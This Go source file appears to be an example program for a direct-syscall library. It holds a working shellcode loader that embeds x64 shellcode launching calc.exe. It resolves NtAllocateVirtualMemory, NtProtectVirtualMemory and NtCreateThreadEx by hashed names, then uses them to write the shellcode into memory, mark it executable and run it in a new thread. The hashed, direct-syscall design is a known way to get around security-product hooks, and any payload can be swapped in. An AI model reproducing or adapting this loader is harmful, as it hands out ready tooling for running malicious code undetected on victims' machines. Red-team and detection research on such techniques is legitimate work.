package main

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/timwhitez/Doge-newSyscall/pkg/newsyscall"
	"syscall"
	"unsafe"
)

var shellcode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66,
	0x83, 0xe4, 0xf0, 0x50, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61,
	0x6c, 0x63, 0x54, 0x59, 0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b,
	0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48,
	0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48,
	0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17,
	0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e,
	0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48,
	0x83, 0xc4, 0x68, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59,
	0x58, 0xc3,
}

func main() {
	var thisThread = uintptr(0xffffffffffffffff)
	alloc, e := newsyscall.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := newsyscall.MemHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	createthread, e := newsyscall.MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()

	createThread(shellcode, thisThread, alloc, protect, createthread, uint64(pWaitForSingleObject))
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	ptr := newsyscall.PrepareSyscall(NtAllocateVirtualMemorySysid)
	r1, r2, err := syscall.Syscall6(ptr, //ntallocatevirtualmemory
		6,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r1 != 0 {
		fmt.Printf("0x%x\n", r1)
		fmt.Println(r2)
		fmt.Println(err)
		return
	}

	//copy shellcode
	memcpy(baseA, shellcode)

	var oldprotect uintptr
	ptr = newsyscall.PrepareSyscall(NtProtectVirtualMemorySysid)
	r1, r2, err = syscall.Syscall6(ptr, //NtProtectVirtualMemory
		5,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
		0,
	)
	if r1 != 0 {
		fmt.Println(r1)
		fmt.Println(r2)
		fmt.Println(err)
		return
	}

	var hhosthread uintptr
	ptr = newsyscall.PrepareSyscall(NtCreateThreadExSysid)
	r1, r2, err = syscall.Syscall12(
		ptr, //NtCreateThreadEx
		11,
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		uintptr(0x1FFFFF),                    //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		0,                                    //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
		0,
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if r1 != 0 {
		fmt.Printf("0x%x\n", r1)
		fmt.Println(r2)
		fmt.Println(err)
		return
	}

}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
